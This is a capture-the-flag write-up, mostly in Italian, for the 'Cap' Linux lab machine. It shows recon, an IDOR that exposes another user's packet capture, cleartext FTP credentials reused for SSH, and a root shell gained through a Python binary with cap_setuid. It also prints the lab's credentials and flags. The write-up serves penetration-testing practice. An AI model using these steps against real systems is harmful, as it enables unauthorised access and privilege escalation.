# Cap — Linux — Easy

**Target:** `10.129.21.73`

---

## Recon

### Nmap

```
nmap -sV -sC -p- cap
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
```

![descrizione](Pasted%20image%2020260418101446.png)

### Open Ports Summary

|Port|Service|Version|
|---|---|---|
|21|FTP|vsftpd 3.0.3|
|22|SSH|OpenSSH 8.2p1|
|80|HTTP|Gunicorn|

---

## Web (Port 80)

### Technology

- **Server:** Gunicorn (Python WSGI)
- **Framework:** Flask
- **CMS:** N/A

![Web dashboard](Pasted%20image%2020260418101519.png)
### Directory Brute Force

```
gobuster dir -u http://cap -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
```

```
/data     (Status: 302) --> /
/ip       (Status: 200)
/capture  (Status: 302) --> /data/1
```


### IDOR — Accesso al pcap

Navigando su `/data/1` si nota che l'URL contiene un ID numerico. Modificando il parametro a `/data/0` si accede al pcap di un altro utente (IDOR — Insecure Direct Object Reference).

### Analisi pcap

Aprendo il file in Wireshark e filtrando per traffico FTP, si trovano credenziali in chiaro:

```
USER nathan
PASS Buck3tH4TF0RM3!
```

![Credentials](Pasted%20image%2020260418101902.png)
### Credentials Found

|Username|Password|Trovate in|
|---|---|---|
|nathan|Buck3tH4TF0RM3!|pcap FTP|

---

## Foothold

Le credenziali FTP funzionano anche su SSH (credential reuse):

bash

```bash
ssh nathan@10.129.21.73
# password: Buck3tH4TF0RM3!
```

- **User ottenuto:** `nathan`
- **Metodo:** Credential reuse (FTP → SSH)

### User Flag

bash

```bash
cat ~/user.txt
```

```
7c012f614a6b00bd64c619c26a5d2c16
```

---

## Privilege Escalation

### Enumeration

bash

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

`python3.8` ha la capability `cap_setuid`, che permette di cambiare l'UID del processo a 0 (root) senza essere SUID.

### Exploit — Linux Capabilities (cap_setuid)

bash

```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

```
root@cap:/tmp#
```

### Root Flag

bash

```bash
cat /root/root.txt
```

```
76ac2e207b493164d7b1b17c32f10953
```

---

## Loot

|Tipo|Valore|
|---|---|
|Credenziali|`nathan:Buck3tH4TF0RM3!`|
|SSH keys|N/A|
|Hashes|N/A|

---

## Lessons Learned

1. **IDOR su parametri numerici negli URL** — prima di fare brute force o cercare CVE, ispeziona sempre come l'applicazione gestisce gli ID nelle richieste. Cambiare `/data/1` in `/data/0` ha esposto dati di altri utenti.
2. **Linux Capabilities come vettore di privesc** — `getcap -r / 2>/dev/null` è un check distinto dai SUID binaries e va sempre eseguito. Un binario con `cap_setuid` (es. Python) permette di impostare l'UID a 0 e ottenere una shell root.

---